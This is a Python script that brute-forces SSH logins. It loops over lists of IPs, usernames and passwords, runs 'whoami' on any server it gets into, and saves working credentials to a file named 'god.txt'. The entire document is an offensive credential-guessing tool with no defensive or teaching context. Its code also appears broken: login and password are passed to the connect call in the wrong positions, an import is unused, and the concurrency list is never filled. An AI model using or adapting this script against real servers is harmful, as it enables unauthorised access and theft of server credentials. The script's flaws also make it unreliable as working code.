import paramiko
import asyncio, asyncssh, sys
import time


async def try_connect(ip, login, password, port: int = 22):
    try:
        async with asyncssh.connect(ip, login, password) as conn:
            result = await conn.run('whoami', check=True)
            print(result.stdout)
    except OSError:
        return None
    except asyncssh.Error:
        return None
    except Exception:
        return None
    print(write_res(ip, login, password))
    return f'{ip} {login} {password}'


def write_res(ip, login, password):
    with open('god.txt', 'a') as file:
        file.write(ip + ',' + login + ',' + password + '\n')
        return ip + ',' + login + ',' + password


async def main():
    processes = []
    with open('ips.txt', 'r') as ips_file:
        ips = ips_file.read().split('\n')
        with open('passwords.txt', 'r') as passwords_file:
            passwords = passwords_file.read().split('\n')
            with open('logins.txt', 'r') as logins_file:
                logins = logins_file.read().split('\n')
                for password in passwords:
                    for login in logins:
                        for ip in ips:
                            if len(processes) <= 20:
                                task = asyncio.create_task(try_connect(ip, login, password))
                                await task


if __name__ == '__main__':
    asyncio.run(main())
